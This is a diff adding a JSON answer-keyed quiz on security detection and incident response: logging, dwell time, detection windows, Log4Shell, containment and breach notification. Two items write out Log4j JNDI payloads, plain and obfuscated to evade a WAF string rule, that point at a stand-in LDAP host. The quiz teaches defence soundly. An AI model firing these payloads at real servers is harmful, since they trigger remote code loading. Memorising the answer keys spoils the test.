@@ -1,0 +1,378 @@
+[
+  {
+    "id": "secp-detection-response-q1",
+    "level": "basic",
+    "type": "single",
+    "prompt": "What does **dwell time** measure?",
+    "options": [
+      {
+        "text": "How long an attacker is inside an environment before being detected",
+        "explanation": "Correct. It measures compromise-to-detection in the stated dataset; published medians depend on case selection and do not represent every intrusion."
+      },
+      {
+        "text": "How long a security alert waits in the queue before an analyst looks at it",
+        "explanation": "That is time-to-triage, a SOC operations metric. Dwell time is about the attacker, not the queue."
+      },
+      {
+        "text": "How long it takes to restore service after an incident",
+        "explanation": "That is recovery time (related to RTO). Dwell time ends at detection, before recovery starts."
+      },
+      {
+        "text": "How long logs are retained",
+        "explanation": "Retention matters *because* of dwell time (you need logs covering the whole intrusion), but it is a different thing."
+      }
+    ],
+    "answer": 0,
+    "workedExample": "For a hypothetical compromise at day 0 and detection at day 12, dwell time is 12 days. Containment and recovery happen later and have separate metrics. SolarWinds customers had different installation, follow-on activity and discovery dates, so one campaign duration is not every victim's dwell time.",
+    "link": {
+      "title": "NIST SP 800-61 Rev. 3: Incident Response Recommendations",
+      "url": "https://csrc.nist.gov/pubs/sp/800/61/r3/final"
+    }
+  },
+  {
+    "id": "secp-detection-response-q2",
+    "level": "basic",
+    "type": "single",
+    "prompt": "Which of these should **not** appear in an application's security log?",
+    "options": [
+      {
+        "text": "The user ID and source IP of a failed login",
+        "explanation": "This is exactly the 'who' and 'where' an investigator needs. Logging it is recommended."
+      },
+      {
+        "text": "The timestamp (UTC) of an admin changing another user's role",
+        "explanation": "Privilege changes are high-value audit events; the timestamp is essential for building a timeline."
+      },
+      {
+        "text": "The password the user typed in a failed login attempt",
+        "explanation": "Correct. Failed passwords are often the real password with a typo, or a password for another site. Logging them turns your log store into a credential store."
+      },
+      {
+        "text": "The outcome (success/failure) of an access-control check",
+        "explanation": "Authorisation failures are a key signal of probing and misuse; record them."
+      }
+    ],
+    "answer": 2,
+    "workedExample": "1. A good event says who, what, when, where and outcome.\n2. Options A, B and D supply those.\n3. A typed password is a *secret*, not metadata. Anyone who can read logs (many more people than can read the password database) would learn real credentials.\n4. The same applies to session tokens, API keys and full card numbers. Redact centrally in the logging layer.",
+    "link": {
+      "title": "OWASP Logging Cheat Sheet",
+      "url": "https://cheatsheetseries.owasp.org/cheatsheets/Logging_Cheat_Sheet.html"
+    }
+  },
+  {
+    "id": "secp-detection-response-q3",
+    "level": "basic",
+    "type": "single",
+    "prompt": "Why should security logs be shipped off the host quickly to a central, append-only store?",
+    "options": [
+      {
+        "text": "Because local disks are too slow to write logs",
+        "explanation": "Disk speed is rarely the issue; the concern is integrity and availability of evidence."
+      },
+      {
+        "text": "Because regulators forbid storing logs on application servers",
+        "explanation": "No general rule forbids this. The reason is about attacker behaviour, not regulation."
+      },
+      {
+        "text": "Because centralised logs never need retention policies",
+        "explanation": "Central logs still need retention matched to how long incidents take to find."
+      },
+      {
+        "text": "Because an attacker with control of the host can delete or alter local logs to hide their activity",
+        "explanation": "Correct. Off-host storage with appropriately separated privileges can preserve already received records. A compromised source can still suppress future events or send false records, and central-store compromise is a separate risk."
+      }
+    ],
+    "answer": 3,
+    "workedExample": "Central collection reduces the chance that host compromise erases all evidence. It cannot guarantee every event was shipped before tampering, nor that the source reported truthfully. Configure retention/immutability and access controls, monitor gaps and protect the collector itself. S3 Object Lock behavior depends on retention mode and permissions.",
+    "link": {
+      "title": "MITRE ATT&CK T1070: Indicator Removal",
+      "url": "https://attack.mitre.org/techniques/T1070/"
+    }
+  },
+  {
+    "id": "secp-detection-response-q4",
+    "level": "intermediate",
+    "type": "single",
+    "prompt": "Using the lesson's detector (`WINDOW = 60`, `LIMIT = 5`, alert when `len(q) > LIMIT`), one IP has failed logins at these times in seconds:\n\n```\n0, 10, 20, 30, 40, 50, 55, 70\n```\n\nAt which timestamps does `alert` fire?",
+    "options": [
+      {
+        "text": "Only at 50",
+        "explanation": "It also fires on every later event while more than 5 events remain in the window; the detector does not suppress repeats."
+      },
+      {
+        "text": "At 50 and 55 only",
+        "explanation": "At 70 the events at 0 and 10 drop out (both are <= 70 - 60 = 10), leaving 6 events, which is still more than 5."
+      },
+      {
+        "text": "At 50, 55 and 70",
+        "explanation": "Correct. At 50 there are 6 events in the window, at 55 there are 7, and at 70, after dropping 0 and 10, there are 6."
+      },
+      {
+        "text": "It never fires, because no 60-second window contains more than 5 events",
+        "explanation": "The window 0 to 50 already contains 6 events (0, 10, 20, 30, 40, 50)."
+      }
+    ],
+    "answer": 2,
+    "workedExample": "Drop rule: remove from the front while `q[0] <= ts - 60`.\n\n```\nts  cutoff  window             len\n0   -60     [0]                 1\n10  -50     [0,10]              2\n20  -40     [0..20]             3\n30  -30     [0..30]             4\n40  -20     [0..40]             5\n50  -10     [0..50]             6 !\n55   -5     [0..55]             7 !\n70   10     [20,30,40,50,55,70] 6 !\n```\n\nAlerts at 50, 55 and 70. In practice you would de-duplicate (one alert per IP per window) to avoid flooding the SOC.",
+    "link": {
+      "title": "OWASP Logging Cheat Sheet",
+      "url": "https://cheatsheetseries.owasp.org/cheatsheets/Logging_Cheat_Sheet.html"
+    }
+  },
+  {
+    "id": "secp-detection-response-q5",
+    "level": "intermediate",
+    "type": "single",
+    "prompt": "On 11 December 2021 your WAF blocks any request containing the literal string `${jndi:`. Which request still gets through and can still exploit a vulnerable Log4j?",
+    "options": [
+      {
+        "text": "`User-Agent: ${jndi:ldap://x.example/a}`",
+        "explanation": "This contains the literal `${jndi:` and would be blocked by the rule."
+      },
+      {
+        "text": "`User-Agent: ${${lower:j}ndi:ldap://x.example/a}`",
+        "explanation": "Correct. Log4j evaluates the inner `${lower:j}` to `j`, producing `${jndi:ldap://...}` at log time, but the raw request never contains the literal string the WAF looks for."
+      },
+      {
+        "text": "`User-Agent: jndi-ldap-x.example`",
+        "explanation": "Without the `${...}` lookup syntax, Log4j treats this as plain text; nothing is resolved."
+      },
+      {
+        "text": "`User-Agent: $jndi:ldap://x.example/a`",
+        "explanation": "Without braces this is not a lookup, so Log4j logs it literally."
+      }
+    ],
+    "answer": 1,
+    "workedExample": "1. Log4j processes nested lookups from the inside out.\n2. `${lower:j}` -> `j`, so `${${lower:j}ndi:...}` -> `${jndi:...}` -> JNDI lookup fires.\n3. The WAF matched raw bytes and saw no `${jndi:`.\n4. Cloudflare observed exactly this evolution within days, and advised treating *any* `${` as suspicious.\n5. The robust fix was patching; robust detection looked at behaviour (outbound LDAP from servers).",
+    "link": {
+      "title": "Log4j exploitation before disclosure and WAF evasion — Cloudflare",
+      "url": "https://blog.cloudflare.com/exploitation-of-cve-2021-44228-before-public-disclosure-and-evolution-of-waf-evasion-patterns/"
+    }
+  },
+  {
+    "id": "secp-detection-response-q6",
+    "level": "intermediate",
+    "type": "multi",
+    "prompt": "Which detections sit **high** on the Pyramid of Pain (costly for the attacker to evade)? Select all that apply.",
+    "options": [
+      {
+        "text": "A web application's Java process spawns `/bin/sh`",
+        "explanation": "Correct as a behavioral signal when unusual for this application. An attacker may execute within the process without spawning a shell, so it is not a required step in every exploit."
+      },
+      {
+        "text": "The SHA-256 hash of a known malware sample",
+        "explanation": "Incorrect. Hashes are at the bottom: recompiling or changing one byte produces a new hash."
+      },
+      {
+        "text": "A production database server making an outbound connection to an internet LDAP server",
+        "explanation": "Correct as an unexpected behavior pattern. It catches some techniques independently of payload spelling, but alternative protocols, in-process execution or existing local gadgets can bypass this particular signal."
+      },
+      {
+        "text": "A list of 50 IP addresses from a threat-intel feed",
+        "explanation": "Incorrect. IPs are cheap to change; attackers rotate through cloud providers and proxies within hours."
+      },
+      {
+        "text": "A service account that normally only uses the API logging in interactively from a laptop",
+        "explanation": "Correct. Identity-behaviour anomalies like this describe how the attacker operates, not which tools they use."
+      }
+    ],
+    "answer": [
+      0,
+      2,
+      4
+    ],
+    "workedExample": "1. Pyramid (bottom to top): hashes, IPs, domains, artefacts, tools, TTPs.\n2. Ask of each signal: how cheaply can the attacker change it and keep working?\n   - Hash: recompile. Trivial.\n   - IP list: new VPS. Trivial.\n   - Shell from web process, outbound LDAP from DB, service account used interactively: the attacker must change their *technique*.\n3. So A, C and E are high-value behavioural detections.",
+    "link": {
+      "title": "The Pyramid of Pain — David Bianco",
+      "url": "http://detect-respond.blogspot.com/2013/03/the-pyramid-of-pain.html"
+    }
+  },
+  {
+    "id": "secp-detection-response-q7",
+    "level": "intermediate",
+    "type": "single",
+    "prompt": "During an incident, a responder wants to reboot a compromised Linux server immediately to 'kill the malware'. What is the main problem?",
+    "options": [
+      {
+        "text": "Rebooting is too slow to contain the attack",
+        "explanation": "Speed isn't the concern; a reboot is quick. The concern is what it destroys."
+      },
+      {
+        "text": "Rebooting destroys volatile evidence (memory, running processes, network connections), which should be captured first, in order of volatility",
+        "explanation": "Correct: rebooting normally loses volatile memory and live process/network evidence. Isolate and collect evidence where safe and feasible, balancing urgent harm and operational constraints."
+      },
+      {
+        "text": "Rebooting always spreads the malware to other hosts",
+        "explanation": "A reboot doesn't inherently spread malware. The issue is evidence loss and, possibly, persistence surviving the reboot anyway."
+      },
+      {
+        "text": "Rebooting is illegal without a court order",
+        "explanation": "Organisations can reboot their own servers. Evidence handling matters for any later legal action, but there is no such legal ban."
+      }
+    ],
+    "answer": 1,
+    "workedExample": "RFC 3227 prioritises volatile evidence, including registers/cache and memory/network/process state, before more persistent stores. Collection itself changes the system, and reboot can lose valuable state without removing persistence. Use an incident-specific preservation/containment plan; immediate safety or damage control can take precedence.",
+    "link": {
+      "title": "RFC 3227: Guidelines for Evidence Collection and Archiving",
+      "url": "https://www.rfc-editor.org/rfc/rfc3227"
+    }
+  },
+  {
+    "id": "secp-detection-response-q8",
+    "level": "intermediate",
+    "type": "single",
+    "prompt": "What was reportedly the signal that led FireEye to uncover the SolarWinds campaign in late 2020?",
+    "options": [
+      {
+        "text": "An antivirus signature matching the SUNBURST DLL",
+        "explanation": "SUNBURST was compiled into a legitimately signed Orion DLL and had no known signature at the time; that is why it went unnoticed for months."
+      },
+      {
+        "text": "A spike in outbound traffic volume to Russia",
+        "explanation": "The attackers deliberately used infrastructure in the victim's own country and imitated Orion's protocol to avoid exactly this."
+      },
+      {
+        "text": "An unexpected additional authentication verifier associated with an employee account",
+        "explanation": "Correct. Mandia confirmed an unexpected authentication verifier was a tip-off; investigation established the wider compromise."
+      },
+      {
+        "text": "A customer's bug-bounty report",
+        "explanation": "The discovery came from FireEye's own investigation, not a bounty submission."
+      }
+    ],
+    "answer": 2,
+    "workedExample": "Mandia confirmed in Senate testimony that an unexpected additional authentication verifier was a tip-off. Investigation then connected the intrusion to the broader campaign. This illustrates the value of investigating identity anomalies; the checked testimony does not establish the precise employee-phone-call sequence.",
+    "link": {
+      "title": "Kevin Mandia testimony, Senate hearing, 23 February 2021",
+      "url": "https://www.intelligence.senate.gov/2021/02/18/hearings-open-hearing-hearing-hack-us-networks-foreign-adversary/"
+    }
+  },
+  {
+    "id": "secp-detection-response-q9",
+    "level": "advanced",
+    "type": "single",
+    "prompt": "You discover a stealthy, well-resourced intruder with footholds on at least 12 hosts and several stolen admin credentials. Scoping is incomplete. What containment strategy is generally best?",
+    "options": [
+      {
+        "text": "Immediately wipe the first host you find, then look for the next one",
+        "explanation": "Piecemeal eviction tips off the attacker, who then uses the remaining footholds (and credentials) to dig in deeper or change tactics."
+      },
+      {
+        "text": "Use time-bounded scoping and plan coordinated eviction where feasible, while containing sooner if ongoing harm or safety requires it",
+        "explanation": "Correct. Coordinated action can reduce the chance of leaving obvious footholds, but waiting for certainty about every foothold is unrealistic. Decide containment timing based on harm, evidence, confidence and operational risk."
+      },
+      {
+        "text": "Publicly announce the breach first so the attacker knows they've been caught and leaves",
+        "explanation": "Attackers don't politely leave; an announcement before containment invites destructive actions and helps them adapt."
+      },
+      {
+        "text": "Rotate the admin passwords now, but leave the hosts running untouched indefinitely",
+        "explanation": "Rotating some credentials alerts the attacker while leaving their host footholds (and perhaps other credentials) in place."
+      }
+    ],
+    "answer": 1,
+    "workedExample": "1. Threat: capable and persistent, with multiple footholds and credentials.\n2. If you remove one foothold, the attacker notices and uses another, perhaps deploying new persistence you haven't seen.\n3. So scope quietly: hunt via logs, EDR and network data for all footholds.\n4. Plan the eviction: credential rotation (including service accounts and keys), host isolation and rebuild, blocking C2 domains, all in one window.\n5. Override this if active harm (exfiltration, ransomware) is ongoing: then contain now.",
+    "link": {
+      "title": "NIST SP 800-61 Rev. 2: Computer Security Incident Handling Guide",
+      "url": "https://csrc.nist.gov/pubs/sp/800/61/r2/final"
+    }
+  },
+  {
+    "id": "secp-detection-response-q10",
+    "level": "advanced",
+    "type": "multi",
+    "prompt": "During Log4Shell, which detection or mitigation approaches were robust against the payload obfuscation seen in the wild? Select all that apply.",
+    "options": [
+      {
+        "text": "Blocking outbound LDAP and RMI connections from application servers at the firewall, and alerting on attempts",
+        "explanation": "Correct as a layer against exploit paths requiring those outbound protocols, regardless of input obfuscation. It is not complete prevention: alternative egress, local gadgets and other behaviors need assessment."
+      },
+      {
+        "text": "Detecting Java processes spawning shells or download tools",
+        "explanation": "Correct for attacks that spawn those processes. Behavior detection is independent of the original string but does not cover every post-exploitation path."
+      },
+      {
+        "text": "Upgrading Log4j to a fixed version (eventually 2.17.1 for Java 8)",
+        "explanation": "Correct. Fixing the root cause makes obfuscation irrelevant. (Early mitigations such as removing `JndiLookup.class` also worked.)"
+      },
+      {
+        "text": "A WAF rule matching the exact string `${jndi:ldap://`",
+        "explanation": "Incorrect. `${${lower:j}ndi:...}`, `${${::-j}...}` and the `dns:`/`rmi:` schemes all avoid it."
+      },
+      {
+        "text": "Scanning only HTTP request logs at the edge",
+        "explanation": "Incorrect. Any logged field could carry the payload (usernames, email headers, chat messages), including data that never passed the web edge."
+      }
+    ],
+    "answer": [
+      0,
+      1,
+      2
+    ],
+    "workedExample": "Literal-string WAF rules can be evaded and web-edge visibility is incomplete. Appropriate patching addresses the vulnerable implementation. Egress restrictions and behavioral detections add coverage for relevant exploit paths, but do not guarantee every possible execution or exfiltration behavior is detected.",
+    "link": {
+      "title": "Log4j exploitation before disclosure and WAF evasion — Cloudflare",
+      "url": "https://blog.cloudflare.com/exploitation-of-cve-2021-44228-before-public-disclosure-and-evolution-of-waf-evasion-patterns/"
+    }
+  },
+  {
+    "id": "secp-detection-response-q11",
+    "level": "advanced",
+    "type": "single",
+    "prompt": "A UK GDPR controller becomes aware of a reportable personal-data breach at 09:00 UTC on Monday. What is the notification timing rule, and what does it imply for preparation?",
+    "options": [
+      {
+        "text": "30 days after the investigation finishes; preparation is mostly about writing a good final report",
+        "explanation": "There is no 30-day window, and the clock starts at awareness, not the end of the investigation."
+      },
+      {
+        "text": "No notification is needed unless card numbers were stolen",
+        "explanation": "Names and addresses are personal data. Notification is required unless the breach is unlikely to result in a risk to individuals' rights and freedoms."
+      },
+      {
+        "text": "Notify the ICO without undue delay and, where feasible, within 72 hours of awareness (Thursday 09:00UTC); prepare decision-makers and contact routes in advance",
+        "explanation": "Correct. The 72-hour point is not permission to wait unnecessarily. If information is incomplete it may be supplied in phases; delay beyond 72 hours needs reasons. The prompt assumes the risk threshold requires notification."
+      },
+      {
+        "text": "Within 24 hours, and only after all affected customers have been told",
+        "explanation": "The regulator deadline is 72 hours, and notifying the regulator is not conditional on first notifying individuals."
+      }
+    ],
+    "answer": 2,
+    "workedExample": "Monday 09:00UTC plus 72 elapsed hours is Thursday 09:00UTC. A reportable breach must be notified without undue delay and, where feasible, within that period. Supply available information and update it as facts emerge; document reasons for delay. Notification assessment and appropriate specialist advice should be part of the response plan.",
+    "link": {
+      "title": "ICO personal-data breach reporting guidance",
+      "url": "https://ico.org.uk/for-organisations/report-a-breach/personal-data-breach/"
+    }
+  },
+  {
+    "id": "secp-detection-response-q12",
+    "level": "advanced",
+    "type": "single",
+    "prompt": "After an accidental bucket exposure, why does a blameless postmortem focus on system conditions and safeguards rather than making punishment its primary purpose?",
+    "options": [
+      {
+        "text": "Because nobody is ever accountable for anything in a blameless culture",
+        "explanation": "Blameless does not mean unaccountable. Teams remain accountable for implementing the fixes; it's individual *blame* for honest mistakes that is avoided."
+      },
+      {
+        "text": "Because legally the cloud provider is always responsible for misconfigurations",
+        "explanation": "Under the shared responsibility model, bucket configuration is the customer's responsibility. Liability isn't the reason."
+      },
+      {
+        "text": "Because postmortems should never mention what anyone did",
+        "explanation": "Postmortems describe actions in detail (who did what, when); they just frame them as reasonable decisions given the information and tools available."
+      },
+      {
+        "text": "Because punishing honest mistakes teaches people to hide them, while the real cause is a system that let one person make public a sensitive bucket without guardrails",
+        "explanation": "Correct. The useful questions are systemic: why was public access possible, why was there no review, why didn't detection fire? Fixes like account-level public-access blocks prevent the whole class of error."
+      }
+    ],
+    "answer": 3,
+    "workedExample": "Describe what happened and the conditions that made the error possible. Identify safeguards such as public-access controls, review and detection, with owners and deadlines. A learning-focused review encourages candid reporting; it does not preclude separate accountability processes or establish a universal employment/legal rule.",
+    "link": {
+      "title": "Postmortem culture — Google SRE book",
+      "url": "https://sre.google/sre-book/postmortem-culture/"
+    }
+  }
+]
